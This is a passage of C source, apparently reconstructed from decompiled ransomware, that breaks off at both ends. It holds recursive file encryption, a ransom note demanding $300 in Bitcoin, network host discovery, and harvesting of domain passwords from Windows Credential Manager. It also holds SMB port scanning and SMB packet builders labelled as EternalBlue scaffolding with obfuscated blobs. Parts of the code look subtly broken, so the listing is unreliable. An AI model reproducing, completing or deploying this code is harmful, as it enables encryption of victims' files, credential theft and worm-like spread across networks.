    BYTE *view = MapViewOfFile(m, FILE_MAP_WRITE | FILE_MAP_READ,
                               0, 0, viewLen);
    if (view) {
        DWORD len = (DWORD)viewLen;
        if (CryptEncrypt(hAES, 0, final, 0, view, &len, mapSize))
            FlushViewOfFile(view, len);
        UnmapViewOfFile(view);
    }
    CloseHandle(m);
    CloseHandle(h);
}

/* 0x10001973 - recursive extension-based file encryption */
void recursively_encrypt_tree(LPCWSTR dir, int depth, HCRYPTKEY hAES)
{
    if (!dir || depth == 0) return;

    WCHAR pattern[MAX_PATH];
    if (!PathCombineW(pattern, dir, L"*")) return;

    WIN32_FIND_DATAW fd;
    HANDLE h = FindFirstFileW(pattern, &fd);
    if (h == INVALID_HANDLE_VALUE) return;

    do {
        if (wcscmp(fd.cFileName, L".") == 0 ||
            wcscmp(fd.cFileName, L"..") == 0) continue;

        WCHAR full[MAX_PATH];
        if (!PathCombineW(full, dir, fd.cFileName)) continue;

        if ((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
            !(fd.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT))
        {
            if (!StrStrIW(L"C:\\Windows;", full))
                recursively_encrypt_tree(full, depth - 1, hAES);
        }
        else
        {
            LPWSTR ext = PathFindExtensionW(fd.cFileName);
            if (!ext || !*ext) continue;
            WCHAR withDot[32];
            _snwprintf(withDot, 32, L"%ws.", ext);
            if (StrStrIW(kExtList, withDot))
                encrypt_mapped_file(full, hAES);
        }
    } while (FindNextFileW(h, &fd));
    FindClose(h);
}

/* 0x10001d32 - drop README.TXT */
void write_readme(HCRYPTKEY hAES, HCRYPTKEY hRSA, LPCWSTR dir)
{
    LPWSTR key = rsa_export_wrapped(0, hAES, hRSA);
    if (!key) return;

    WCHAR full[MAX_PATH];
    if (!PathCombineW(full, dir, kReadmeName)) { LocalFree(key); return; }

    uint32_t m = remaining_minutes();
    if (m > 1) Sleep((m - 1) * 60000);

    HANDLE h = CreateFileW(full, GENERIC_WRITE, 0, NULL,
                           CREATE_ALWAYS, 0, NULL);
    if (h != INVALID_HANDLE_VALUE) {
        DWORD w = 0;
        static const WCHAR intro[] =
            L"Ooops, your important files are encrypted.\r\n\r\n"
            L"If you see this text, then your files are no longer accessible, "
            L"because\r\nthey have been encrypted. Perhaps you are busy looking "
            L"for a way to recover\r\nyour files, but don't waste your time. "
            L"Nobody can recover your files without\r\nour decryption service."
            L"\r\n\r\nWe guarantee that you can recover all your files safely "
            L"and easily.\r\nAll you need to do is submit the payment and "
            L"purchase the decryption key.\r\n\r\nPlease follow the instructions:"
            L"\r\n\r\n1.\tSend $300 worth of Bitcoin to following address:\r\n\r\n";
        static const WCHAR btc[] =
            L"1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX\r\n\r\n";
        static const WCHAR step2[] =
            L"2.\tSend your Bitcoin wallet ID and personal installation key to e-mail ";
        static const WCHAR mail[] = L"wowsmith123456@posteo.net.\r\n";
        static const WCHAR tail[] = L"\tYour personal installation key:\r\n\r\n";

        WriteFile(h, intro, (DWORD)(wcslen(intro)*2), &w, NULL);
        WriteFile(h, btc,   (DWORD)(wcslen(btc)*2),   &w, NULL);
        WriteFile(h, step2, (DWORD)(wcslen(step2)*2), &w, NULL);
        WriteFile(h, mail,  (DWORD)(wcslen(mail)*2),  &w, NULL);
        WriteFile(h, tail,  (DWORD)(wcslen(tail)*2),  &w, NULL);
        WriteFile(h, key,   (DWORD)(wcslen(key)*2),   &w, NULL);
        CloseHandle(h);
    }
    LocalFree(key);
}

/* =========================================================================
 *  NETWORK DISCOVERY
 * ========================================================================= */

/* 0x1000777b - GetExtendedTcpTable(TCP_TABLE_OWNER_PID_CONNECTIONS) */
BOOL enumerate_tcp_conns(void *set)
{
    HMODULE iphlp = LoadLibraryW(L"iphlpapi.dll");
    if (!iphlp) return FALSE;

    typedef DWORD (WINAPI *pfnGetExtTcp)(PVOID, PDWORD, DWORD, DWORD, DWORD, DWORD);
    pfnGetExtTcp f = (pfnGetExtTcp)GetProcAddress(iphlp, "GetExtendedTcpTable");
    if (!f) { FreeLibrary(iphlp); return FALSE; }

    DWORD sz = 0x100000;
    PMIB_TCPTABLE_OWNER_PID t = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sz);
    if (!t) { FreeLibrary(iphlp); return FALSE; }

    BOOL ok = FALSE;
    if (f(t, &sz, 0, AF_INET, TCP_TABLE_OWNER_PID_CONNECTIONS, 0) == NO_ERROR) {
        ok = TRUE;
        for (DWORD i = 0; i < t->dwNumEntries; i++) {
            MIB_TCPROW_OWNER_PID *r = &t->table[i];
            if (r->dwState != MIB_TCP_STATE_TIME_WAIT) continue;
            char s[32];
            _snprintf(s, sizeof s, "%u.%u.%u.%u",
                      (BYTE)(r->dwRemoteAddr),
                      (BYTE)(r->dwRemoteAddr >> 8),
                      (BYTE)(r->dwRemoteAddr >> 16),
                      (BYTE)(r->dwRemoteAddr >> 24));
            LPWSTR w = utf8_to_wide(s);
            if (w) { FUN_10006fc7(set, w); heap_free(w); }
        }
    }
    heap_free(t);
    FreeLibrary(iphlp);
    return ok;
}

/* 0x1000786b - GetIpNetTable, filters broadcast MAC */
void enumerate_arp(void *set)
{
    ULONG sz = 0;
    if (GetIpNetTable(NULL, &sz, 0) != ERROR_INSUFFICIENT_BUFFER) return;

    PMIB_IPNETTABLE t = HeapAlloc(GetProcessHeap(), 0, sz);
    if (!t) return;

    if (GetIpNetTable(t, &sz, 0) == NO_ERROR) {
        for (DWORD i = 0; i < t->dwNumEntries; i++) {
            MIB_IPNETROW *r = &t->table[i];
            if (r->dwPhysAddrLen == 6 &&
                r->bPhysAddr[0] == 0xff &&
                r->bPhysAddr[1] == 0xff)
                continue;
            char s[32];
            _snprintf(s, sizeof s, "%u.%u.%u.%u",
                      (BYTE)(r->dwAddr),
                      (BYTE)(r->dwAddr >> 8),
                      (BYTE)(r->dwAddr >> 16),
                      (BYTE)(r->dwAddr >> 24));
            LPWSTR w = utf8_to_wide(s);
            if (w) { FUN_10006fc7(set, w); heap_free(w); }
        }
    }
    heap_free(t);
}

/* 0x1000795a - NetServerEnum */
void enumerate_net_servers(void *set, DWORD domain, DWORD level)
{
    (void)domain; (void)level;
    PSERVER_INFO_101 *buf = NULL;
    DWORD read = 0, total = 0, resume = 0;

    if (NetServerEnum(NULL, 101, (LPBYTE*)&buf, MAX_PREFERRED_LENGTH,
                      &read, &total, SV_TYPE_ALL, NULL, &resume)
        != NERR_Success)
        return;

    for (DWORD i = 0; i < read; i++) {
        if (buf[i]->sv101_type & SV_TYPE_DOMAIN_ENUM) continue;
        if ((buf[i]->sv101_platform_id == PLATFORM_ID_DOS ||
             buf[i]->sv101_platform_id == PLATFORM_ID_OS2) &&
            (buf[i]->sv101_type & SV_TYPE_SERVER))
        {
            LPWSTR w = utf8_to_wide(buf[i]->sv101_name);
            if (w) { FUN_10006fc7(set, w); heap_free(w); }
        }
    }
    if (buf) NetApiBufferFree(buf);
}

/* 0x10007a17 - WNetOpenEnum / WNetEnumResource */
void enumerate_shares(LPNETRESOURCEW root)
{
    HANDLE hEnum = NULL;
    if (WNetOpenEnumW(RESOURCE_GLOBALNET, RESOURCETYPE_ANY, 0,
                      root, &hEnum) != NO_ERROR)
        return;

    DWORD bufSize = 0x4000;
    HGLOBAL mem = GlobalAlloc(GHND, bufSize);
    if (!mem) { WNetCloseEnum(hEnum); return; }

    DWORD count = (DWORD)-1;
    while (WNetEnumResourceW(hEnum, &count, mem, &bufSize) == NO_ERROR) {
        LPNETRESOURCEW nr = (LPNETRESOURCEW)mem;
        for (DWORD i = 0; i < count; i++) {
            if (nr[i].dwUsage & RESOURCEUSAGE_CONTAINER)
                enumerate_shares(&nr[i]);
            else if (nr[i].lpRemoteName &&
                     nr[i].lpRemoteName[0] == L'\\' &&
                     nr[i].lpRemoteName[1] == L'\\')
            {
                LPWSTR name = nr[i].lpRemoteName;
                WCHAR  host[256];
                int    n = 2;
                while (name[n] && name[n] != L'\\') n++;
                wcsncpy(host, name, n);
                host[n] = 0;
                FUN_10006fc7(g_pUserList, host);
            }
        }
        count = (DWORD)-1;
    }
    GlobalFree(mem);
    WNetCloseEnum(hEnum);
}

/* 0x10007b31 - CredEnumerateW; filters "Domain:" + CRED_TYPE_DOMAIN_PASSWORD */
void harvest_cred_manager(void)
{
    DWORD count = 0;
    PCREDENTIALW *creds = NULL;
    if (!CredEnumerateW(NULL, 0, &count, &creds)) return;

    for (DWORD i = 0; i < count; i++) {
        PCREDENTIALW c = creds[i];
        if (!c->TargetName) continue;
        if (wcsncmp(c->TargetName, L"Domain:", 7) != 0) continue;
        if (c->Type != CRED_TYPE_DOMAIN_PASSWORD) continue;
        if (!c->CredentialBlob || !c->UserName) continue;
        FUN_10006de0(c->UserName, (LPWSTR)c->CredentialBlob, 0);
        FUN_10006fc7(g_pUserList, c->TargetName);
    }
    CredFree(creds);
}

/* 0x10007c10 - the credential discovery thread */
DWORD WINAPI discovery_thread(LPVOID ctx)
{
    (void)ctx;
    FUN_10006fc7(g_pUserList, g_szComputerName);
    FUN_10006fc7(g_pUserList, g_szComputerName);

    DWORD hl = 260;
    GetComputerNameExW(ComputerNamePhysicalNetBIOS, g_szComputerName, &hl);
    FUN_10006fc7(g_pUserList, g_szComputerName);

    CreateThread(NULL, 0, enumerate_adapters_thread, g_pUserList, 0, NULL);

    BOOL serverDone = FALSE;
    for (;;) {
        enumerate_tcp_conns(g_pUserList);
        enumerate_arp(g_pUserList);
        if (!serverDone) {
            enumerate_net_servers(g_pUserList, SV_TYPE_ALL, 0);
            serverDone = TRUE;
        }
        Sleep(180000);                                  /* 3 minutes */
    }
}

/* 0x10008e7f - adapter enumeration */
DWORD WINAPI enumerate_adapters_thread(LPVOID ctx)
{
    (void)ctx;
    ULONG sz = 0;
    GetAdaptersInfo(NULL, &sz);
    IP_ADAPTER_INFO *ai = LocalAlloc(LMEM_FIXED, sz);
    if (!ai) return 0;

    if (GetAdaptersInfo(ai, &sz) == NO_ERROR) {
        for (IP_ADAPTER_INFO *p = ai; p; p = p->Next) {
            LPWSTR n = utf8_to_wide(p->IpAddressList.IpAddress.String);
            if (n) { FUN_10006fc7(g_pUserList, n); heap_free(n); }
            if (p->GatewayList.IpAddress.String[0]) {
                n = utf8_to_wide(p->GatewayList.IpAddress.String);
                if (n) { FUN_10006fc7(g_pUserList, n); heap_free(n); }
            }
        }
    }
    LocalFree(ai);
    if (is_primary_dc()) enumerate_dhcp_clients(g_pUserList);
    return 0;
}

/* 0x10008e04 - spray worker (per-IP in a range) */
DWORD WINAPI spray_thread_from_range(LPVOID p)
{
    struct { uint32_t lo, hi; void* set; } *r = p;
    for (uint32_t ip = r->lo; ip <= r->hi; ip++) {
        if (!check_smb_open(ip)) continue;
        char s[32]; struct in_addr a = { .s_addr = ip };
        strcpy(s, inet_ntoa(a));
        LPWSTR w = utf8_to_wide(s);
        if (w) { FUN_10006fc7(r->set, w); heap_free(w); }
    }
    LocalFree(p);
    return 0;
}

/* 0x1000908a - DHCP client enumeration via DhcpEnumSubnets */
void enumerate_dhcp_clients(void *set)
{
    DHCP_RESUME_HANDLE resume = 0;
    DWORD nRead = 0, nTotal = 0;
    LPDHCP_IP_ARRAY subnets = NULL;
    LPDHCP_SUBNET_INFO info = NULL;
    LPDHCP_CLIENT_INFO_ARRAY clients = NULL;
    WCHAR host[260] = {0};
    DWORD hostLen = 260;
    GetComputerNameExW(ComputerNamePhysicalNetBIOS, host, &hostLen);

    if (DhcpEnumSubnets(host, &resume, 0x400, &subnets, &nRead, &nTotal)
        != ERROR_SUCCESS)
        return;

    for (DWORD i = 0; i < subnets->NumElements; i++) {
        if (DhcpGetSubnetInfo(NULL, subnets->Elements[i], &info) == ERROR_SUCCESS &&
            info->SubnetState == DhcpSubnetEnabled)
        {
            DWORD cliRead = 0;
            if (DhcpEnumSubnetClients(NULL, subnets->Elements[i],
                                      &resume, 0x10000, &clients,
                                      &nRead, &cliRead) == ERROR_SUCCESS)
            {
                for (DWORD j = 0; j < clients->NumElements; j++) {
                    DHCP_CLIENT_INFO *c = clients->Clients[j];
                    if (!c) continue;
                    char s[32]; struct in_addr a = { .s_addr = c->ClientIpAddress };
                    strcpy(s, inet_ntoa(a));
                    LPWSTR w = utf8_to_wide(s);
                    if (w) { FUN_10006fc7(set, w); heap_free(w); }
                }
                DhcpRpcFreeMemory(clients);
            }
        }
        DhcpRpcFreeMemory(info);
    }
    DhcpRpcFreeMemory(subnets);
}

/* 0x10008243 */
BOOL is_primary_dc(void)
{
    LPSERVER_INFO_101 si = NULL;
    DWORD rc = NetServerGetInfo(NULL, 101, (LPBYTE*)&si);
    BOOL is_dc = FALSE;
    if (rc == NERR_Success && si) {
        if ((si->sv101_type & SV_TYPE_DOMAIN_CTRL) ||
            (si->sv101_type & (SV_TYPE_DOMAIN_BAKCTRL | SV_TYPE_SERVER_NT)))
            is_dc = TRUE;
        NetApiBufferFree(si);
    }
    return is_dc;
}

/* =========================================================================
 *  SOCKET HELPERS  (winsock ordinals)
 * ========================================================================= */

/* 0x10006727 */
DWORD raw_socket_connect(SOCKET *sock, uint32_t ip, uint16_t port)
{
    if (*sock == (SOCKET)0x1F) return 0xFFFFFFFF;
    SOCKET s = Ordinal_23(AF_INET, SOCK_STREAM, 0);
    if (s == INVALID_SOCKET) return 0xFFFFFFFF;

    u_long nb = 1;
    Ordinal_10(s, FIONBIO, &nb);

    struct sockaddr_in sa = {0};
    sa.sin_family = AF_INET;
    sa.sin_port   = Ordinal_9(port);
    sa.sin_addr.s_addr = ip;
    Ordinal_4(s, &sa, sizeof sa);

    *sock = s;
    return 0;
}

/* 0x100067af */
DWORD raw_socket_recv_all(SOCKET s, void *buf, int len)
{
    uint32_t total = 0;
    while (total < (uint32_t)len) {
        uint16_t got = Ordinal_16(NULL, (BYTE*)buf + total,
                                  len - total, 0);
        if ((short)got <= 0) return 0xFFFFFFFF;
        total += got;
    }
    return 0;
}

/* 0x1000688f */
int raw_socket_send_all(SOCKET s, const void *buf, int len)
{
    if (!buf) return -1;
    int sent = 0;
    while (sent < len) {
        int n = send(s, (const char*)buf + sent, len - sent, 0);
        if (n <= 0) return -1;
        sent += n;
    }
    return 0;
}

/* 0x1000a2e8 - probe a TCP port */
DWORD probe_tcp_port(uint32_t ip, uint16_t port)
{
    SOCKET s = Ordinal_23(AF_INET, SOCK_STREAM, 0);
    if (s == INVALID_SOCKET) return 0;
    u_long nb = 1;
    Ordinal_10(s, FIONBIO, &nb);

    struct sockaddr_in sa = {0};
    sa.sin_family = AF_INET;
    sa.sin_port   = Ordinal_9(port);
    sa.sin_addr.s_addr = ip;

    DWORD ok = (Ordinal_4(s, &sa, sizeof sa) != -1) ? 1 : 0;
    Ordinal_3(s);
    return ok;
}

/* 0x1000a3d9 */
DWORD check_smb_open(uint32_t ip)
{
    if (probe_tcp_port(ip, 445)) return 1;
    if (probe_tcp_port(ip, 139)) return 1;
    return 0;
}

/* =========================================================================
 *  SMB PACKET BUILDERS (EternalBlue scaffolding)
 *
 *  All functions that build SMB1/SMB2 packets share the pattern:
 *  allocate a heap buffer, fill fixed fields, memcpy payload, return it.
 *  The magic 0x424d53ff in build_smb1_header is "\xffSMB".
 * ========================================================================= */

/* 0x10002466 - build SMB1 header (0x24 bytes) */
uint8_t* build_smb1_header(DWORD pid, BYTE cmd, WORD status, WORD flags,
                           WORD tid, WORD pid2, WORD uid, WORD mid)
{
    uint8_t *h = heap_alloc(0x24);
    if (!h) return NULL;
    *(WORD*)(h + 0x02) = Ordinal_9((uint16_t)(pid - 4));
    *(BYTE*)(h + 0x08) = cmd;
    *(WORD*)(h + 0x0E) = status;
    *(WORD*)(h + 0x10) = flags;
    *(WORD*)(h + 0x1C) = tid;
    *(WORD*)(h + 0x1E) = pid2;
    *(WORD*)(h + 0x20) = uid;
    *(WORD*)(h + 0x22) = mid;
    *(DWORD*)(h + 0x04) = 0x424d53ff;               /* "\xffSMB" */
    *(BYTE*)(h + 0x0D) = 0x18;                      /* flags2 */
    return h;
}

/* 0x100024d0 - build SMB2 negotiate context (0x418 bytes) */
uint16_t* build_smb2_negotiate_ctx(uint32_t unused, uint16_t *outLen, void *dialects)
{
    (void)unused;
    if (!dialects) return NULL;
    *outLen = 0x418;
    uint16_t *b = heap_alloc(0x418);
    if (!b) return NULL;
    *(DWORD*)(b + 2)  = 0x1E;
    *(DWORD*)(b + 6)  = 0x1E;
    *(DWORD*)(b + 10) = 0x1E;
    *b = 0x114;
    *(DWORD*)(b + 4)  = 0x103D0;
    *(DWORD*)(b + 0xC) = 0x4B;
    *(DWORD*)(b + 0xE) = 0x3D0;
    *(DWORD*)(b + 0x10) = 0x68;
    *(BYTE*)(b + 0x12)  = 1;
    *(WORD*)((BYTE*)b + 0x29) = 0x3EC;
    memcpy(b + 0x16, dialects, 0x3EC);
    return b;
}

/* 0x10002547 - build SMB1 NEGOTIATE_PROTOCOL request.
 * Wraps build_smb2_negotiate_ctx + build_smb1_header.
 * The parameters map 1:1 to header fields. */
uint32_t* build_smb1_negotiate(WORD a, WORD b, WORD c, WORD d, WORD e)
{
    void *dialects = heap_alloc(0x3EC);
    if (!dialects) return NULL;
    *(BYTE*)((BYTE*)dialects + 0x1E) = 1;
    uint16_t dialectLen = 0;
    uint16_t *ctx = build_smb2_negotiate_ctx(0, &dialectLen, dialects);
    if (!ctx) { heap_free(dialects); return NULL; }

    uint16_t totalLen = dialectLen + 0x24;
    uint32_t *hdr = (uint32_t*)build_smb1_header(totalLen, 0xA0, 0xC007,
                                                 a, b, c, d, e);
    if (!hdr) { heap_free(dialects); heap_free(ctx); return NULL; }

    uint32_t *out = heap_alloc(totalLen);
    if (out) {
        memcpy(out, hdr, 9 * 4);
        memcpy((BYTE*)out + 0x24, ctx, dialectLen & 0xFFFF);
    }
    heap_free(dialects); heap_free(ctx); heap_free(hdr);
    return out;
}

/* 0x10002620 - build SMB1 SESSION_SETUP request
 * (uses static credentials materialised from DAT_10016014/18/1C/1E,
 *  each byte XOR 0x2B before use) */
uint32_t* build_smb1_session_setup(WORD a, WORD b, WORD c, WORD d, WORD e,
                                   uint16_t *outLen)
{
    BYTE *cred = heap_alloc(0xC);
    if (!cred) return NULL;
    *(DWORD*)(cred + 0) = *(DWORD*)&DAT_10016014;
    *(DWORD*)(cred + 4) = *(DWORD*)&DAT_10016018;
    *(WORD*)(cred + 8) = *(WORD*)&DAT_1001601C;
    cred[10] = *(BYTE*)&DAT_1001601E;
    for (int i = 0; i < 0xB; i++) cred[i] ^= 0x2B;

    uint32_t *secBlob = heap_alloc(0x11);
    if (!secBlob) { heap_free(cred); return NULL; }
    *(WORD*)((BYTE*)secBlob + 1) = 1;
    *(BYTE*)secBlob = 1;
    *(WORD*)((BYTE*)secBlob + 3) = 0xC;
    *(DWORD*)((BYTE*)secBlob + 5) = *(DWORD*)cred;
    *(DWORD*)((BYTE*)secBlob + 9) = *(DWORD*)(cred + 4);
    *(DWORD*)((BYTE*)secBlob + 0xD) = *(DWORD*)(cred + 8);

    *outLen = 0x35;
    uint32_t *hdr = (uint32_t*)build_smb1_header(0x35, 0x2B, 0xC007,
                                                 a, b, c, d, e);
    if (!hdr) { heap_free(cred); heap_free(secBlob); return NULL; }

    uint32_t *out = heap_alloc(0x35);
    if (out) {
        memcpy(out, hdr, 9 * 4);
        out[9]  = secBlob[0];
        out[10] = secBlob[1];
        out[11] = secBlob[2];
        out[12] = secBlob[3];
        *((BYTE*)out + 0x34) = *((BYTE*)secBlob + 0x10);
    }
    heap_free(cred); heap_free(secBlob); heap_free(hdr);
    return out;
}

/* 0x1000270a - build SMB1 TREE_CONNECT */
uint32_t* build_smb1_tree_connect(WORD a, WORD b, WORD c, WORD d)
{
    uint8_t *xored = heap_alloc(0x62);
    if (!xored) return NULL;
    memcpy(xored, DAT_10018ad0, 0x62);
    for (int i = 0; i < 0x62; i++) xored[i] ^= 0x72;

    void *path = heap_alloc(0x65);
    if (!path) { heap_free(xored); return NULL; }
    *(WORD*)((BYTE*)path + 1) = 0x62;
    memcpy((BYTE*)path + 3, xored, 0x62);

    uint32_t *hdr = (uint32_t*)build_smb1_header(0x89, 0x72,
                                                 a, b, 0, c, 0, d);
    if (!hdr) { heap_free(xored); heap_free(path); return NULL; }

    uint32_t *out = heap_alloc(0x89);
    if (out) {
        memcpy(out, hdr, 9 * 4);
        memcpy(out + 9, path, 0x65);
    }
    heap_free(xored); heap_free(path); heap_free(hdr);
    return out;
}

/* 0x10002802 - build SMB2 CREATE request body */
char* build_smb2_create_body(WORD *outLen, BYTE op, WORD a, WORD b)
{
    (void)outLen; (void)op;
    WORD base = 0x1B;
    if (op == '\r') base = 0x1D;
    char *b = heap_alloc(base);
    if (!b) return NULL;
    b[5] = 0x04; b[6] = 0x11; b[7] = 0x0A; b[8] = 0;
    b[0] = (char)op; b[1] = (char)0xFF;
    *(WORD*)(b + 9) = a;
    if (op == '\f') {
        b[0x15] = 0; b[0x16] = 0; b[0x17] = 0; b[0x18] = (char)0x80;
        *(WORD*)(b + 0x19) = 0;                 /* [GHIDRA-UNRECOVERED] src */
    }
    if (op == '\r') {
        b[3]  = (char)0x88; b[4] = 0;
        b[0xF] = 1;          b[0x10] = 0;
        b[0x17] = (char)0xD4; b[0x18] = 0;
        b[0x19] = 0; b[0x1A] = 0;
        *(WORD*)(b + 0x1B) = 0;
    }
    *outLen = base;
    return b;
}

/* 0x100028b5 - build SMB1 CREATE */
uint32_t* build_smb1_create(WORD a, WORD b, WORD c, WORD d, WORD e,
                            WORD f, uint16_t *outLen, BYTE op)
{
    if (op != '\f' && op != '\r') return NULL;

    void *params = NULL;
    if (op == '\f') params = heap_alloc(0x16);
    else {
        params = heap_alloc(0x4B);
        if (params) {
            memcpy(params, DAT_10018b48, 0x4B);
            for (int i = 0; i < 0x4B; i++) ((BYTE*)params)[i] ^= 0x73;
        }
    }
    if (!params) return NULL;

    uint16_t bodyLen = 0;
    char *body = build_smb2_create_body(&bodyLen, op, e, f);
    if (!body) { heap_free(params); return NULL; }

    *outLen = bodyLen + 0x24;
    uint32_t *hdr = (uint32_t*)build_smb1_header(*outLen, 0x73, a, b,
                                                 0, c, 0, d);
    if (!hdr) { heap_free(params); heap_free(body); return NULL; }

    uint32_t *out = heap_alloc(*outLen);
    if (out) {
        memcpy(out, hdr, 9 * 4);
        memcpy(out + 9, body, bodyLen);
    }
    heap_free(params); heap_free(body); heap_free(hdr);
    return out;
}

/* 0x100029ce - build SMB1 READ request */
uint32_t* build_smb1_read(WORD a, WORD b, WORD c, WORD d)
{
    uint8_t *x = heap_alloc(0x2D);
    if (!x) return NULL;
    memcpy(x, DAT_10018b94, 0x2D);
    for (int i = 0; i < 0x2D; i++) x[i] ^= 0x75;

    WORD *p = heap_alloc(0x38);
    if (!p) { heap_free(x); return NULL; }
    *(WORD*)((BYTE*)p + 3) = 0x58;
    *(WORD*)((BYTE*)p + 5) = 8;
    *(WORD*)((BYTE*)p + 7) = 1;
    *(WORD*)((BYTE*)p + 9) = 0x2D;
    *p = 0xFF04;
    memcpy((BYTE*)p + 0xB, x, 0x2D);

    uint32_t *hdr = (uint32_t*)build_smb1_header(0x5C, 0x75, 0xC007,
                                                 a, 0, b, c, d);
    if (!hdr) { heap_free(x); heap_free(p); return NULL; }

    uint32_t *out = heap_alloc(0x5C);
    if (out) {
        memcpy(out, hdr, 9 * 4);
        memcpy(out + 9, p, 0x38);
    }
    heap_free(x); heap_free(p); heap_free(hdr);
    return out;
}

/* 0x10002adf - build SMB2 WRITE body */
uint8_t* build_smb2_write_body(WORD a, WORD b, BYTE cmd, BYTE final)
{
    uint8_t *b = heap_alloc(0x23);
    if (!b) return NULL;
    b[0] = 0x10; b[0x1B] = 2;
    if (cmd == '\x01') {
        *(WORD*)(b + 3) = 1; *(WORD*)(b + 7) = 1;
        *(WORD*)(b + 0x1D) = 0x23; *(WORD*)(b + 5) = b;
        *(DWORD*)(b + 0xD) = 0x1000; *(WORD*)(b + 0x1F) = a;
    }
    if (cmd == '\0') {
        *(DWORD*)(b + 0xD) = 1; *(WORD*)(b + 3) = b;
        *(WORD*)(b + 0x1D) = 0x36; *(WORD*)(b + 0x1F) = a;
    }
    if (cmd == '\x02') {
        *(WORD*)(b + 0x15) = 0x4A; *(WORD*)(b + 0x19) = 0x4A;
        *(WORD*)(b + 0x21) = 7; *(WORD*)(b + 0x23) = 0x505C;
        *(WORD*)(b + 0x25) = 0x5049; *(WORD*)(b + 5) = b;
        *(WORD*)(b + 7) = b; *(DWORD*)(b + 0x1D) = 0x23;
        *(WORD*)(b + 0x27) = 0x5C45;
    }
    if (cmd == '\x03') {
        *(WORD*)(b + 7) = 0x1000; *(WORD*)(b + 0xB) = 8;
        *(WORD*)(b + 0x17) = 0x48; *(WORD*)(b + 0x1F) = a;
        *(WORD*)(b + 0x1D) = 0x26;
        *(WORD*)(b + 0x15) = b; *(WORD*)(b + 0x19) = b;
        *(WORD*)(b + 0x21) = 0x59; *(WORD*)(b + 3) = 0x48;
        *(DWORD*)(b + 0xD) = 1000;
        memcpy(b + 0x23, DAT_10018bd8, 0x59);
        for (int i = 0; i < 0x59; i++) b[0x23 + i] ^= 0x25;
        if (!final) {
            *(DWORD*)(b + 0x54) = 0x12345778;
            *(DWORD*)(b + 0x58) = 0xABCD1234;
            *(DWORD*)(b + 0x5C) = 0x230100EF;
            *(DWORD*)(b + 0x60) = 0xAB896745;
        }
    }
    return b;
}

/* 0x10002c1e - build SMB1 WRITE request */
uint32_t* build_smb1_write(WORD a, WORD b, WORD c, WORD d, WORD e, WORD f,
                           WORD g, WORD h, BYTE op, BYTE final, uint16_t *outLen)
{
    uint8_t *body = build_smb2_write_body(a, b, op, final);
    if (!body) return NULL;

    *outLen = 0x24;
    uint32_t *hdr = (uint32_t*)build_smb1_header(0x24, 0x25,
                                                 c, d, e, f, g, h);
    if (!hdr) { heap_free(body); return NULL; }
    uint32_t *out = heap_alloc(0x24);
    if (out) {
        memcpy(out, hdr, 9 * 4);
        memcpy(out + 9, body, 0);
    }
    heap_free(body); heap_free(hdr);
    return out;
}

/* 0x10002ccf - build SMB1 IOCTL request (filesystem/trans) */
uint8_t* build_smb1_ioctl(DWORD param1, DWORD *param2, void *data,
                          WORD dataLen, uint16_t *outLen)
{
    if ((dataLen != 0 && data == NULL) || param2 == NULL) return NULL;
    *outLen = dataLen + 0x2E;
    uint8_t *b = heap_alloc(*outLen);
    if (!b) return NULL;
    *(WORD*)(b + 0x13) = 0xC; *(WORD*)(b + 1) = 0xC;
    *(WORD*)(b + 0x15) = 0x42; *(WORD*)(b + 0x19) = 0x4E;
    *(WORD*)(b + 5) = 1;
    *(WORD*)(b + 0x1F) = dataLen + 0xD;
    *(WORD*)(b + 0x1D) = 0xE;
    *b = 0xF;
    *(DWORD*)(b + 0xD) = param1;
    b[0x1B] = 1;
    *(DWORD*)(b + 0x22) = param2[0];
    *(DWORD*)(b + 0x26) = param2[1];
    *(DWORD*)(b + 0x2A) = param2[2];
    if (dataLen) {
        *(WORD*)(b + 3) = dataLen;
        *(DWORD*)(b + 0xD) = param1;
        *(WORD*)(b + 0x17) = dataLen;
        memcpy(b + 0x2E, data, dataLen);
    }
    return b;
}

/* 0x10002d82 - build SMB2 IOCTL body */
uint16_t* build_smb2_ioctl_body(BYTE op)
{
    WORD len = 0x33;
    const BYTE *src;
    if (op == '\0') { src = DAT_10018bc4; len += 0x0F; }
    else             { src = DAT_10018b34; len += 0x11; }

    uint16_t *b = heap_alloc(len);
    if (!b) return NULL;
    *(WORD*)((BYTE*)b + 3) = 0x62;
    *(BYTE*)b = (op == '\0') ? 0x18 : 0xFF;   /* [GHIDRA-PARTIAL] */
    b[3] = 0xC;
    *(DWORD*)(b + 4) = 0x16;
    *(DWORD*)(b + 8) = 0x2019F;
    *(DWORD*)(b + 0x10) = 3;
    *(DWORD*)(b + 0x12) = 1;
    *(DWORD*)(b + 0x14) = 0x40;
    *(DWORD*)(b + 0x16) = 2;
    *(BYTE*)(b + 0x18) = 3;
    *(WORD*)((BYTE*)b + 0x31) = (op == '\0') ? 0x0F : 0x11;
    WORD extra = (op == '\0') ? 0x0F : 0x11;
    for (WORD i = 0; i < extra; i++)
        ((BYTE*)b)[0x33 + i] = src[i] ^ 0xA2;
    return b;
}

/* 0x10002e30 - build SMB2 CLOSE body */
char* build_smb2_close_body(BYTE cmd, WORD a, void *data, WORD dataLen,
                            WORD *outLen)
{
    if (dataLen != 0 && data == NULL) return NULL;
    WORD base = (cmd == '\f') ? 0x1C : 0x20;
    *outLen = dataLen + base;
    char *b = heap_alloc(*outLen);
    if (!b) return NULL;
    *(DWORD*)(b + 0xB) = 0xFFFFFFFF;
    b[0] = (char)cmd; b[1] = (char)0xFF;
    *(WORD*)(b + 5) = a;
    if (cmd == '\f') {
        b[3] = '<'; b[4] = 0;
        b[0xF] = 4; b[0x10] = 0; b[0x11] = 0; b[0x12] = (char)0xFE;
        *(WORD*)(b + 0x15) = dataLen;
        b[0x17] = ';'; b[0x18] = 0;
        *(WORD*)(b + 0x19) = dataLen;
    }
    if (cmd == 0x0E) {
        b[3] = '@'; b[4] = 0;
        b[0xF] = 8; b[0x10] = 0;
        b[0x17] = '@'; b[0x18] = 0;
        *(WORD*)(b + 0x11) = dataLen;
        *(WORD*)(b + 0x15) = dataLen;
        *(WORD*)(b + 0x1D) = dataLen + 1;
    }
    if (dataLen) memcpy(b + (*outLen - dataLen), data, dataLen);
    return b;
}

/* 0x10002ef5 - send SMB1 NEGOTIATE_PROTOCOL */
DWORD smb1_negotiate_send(WORD a, WORD b, WORD c, WORD d)
{
    uint32_t *pkt = build_smb1_negotiate(a, b, c, d);
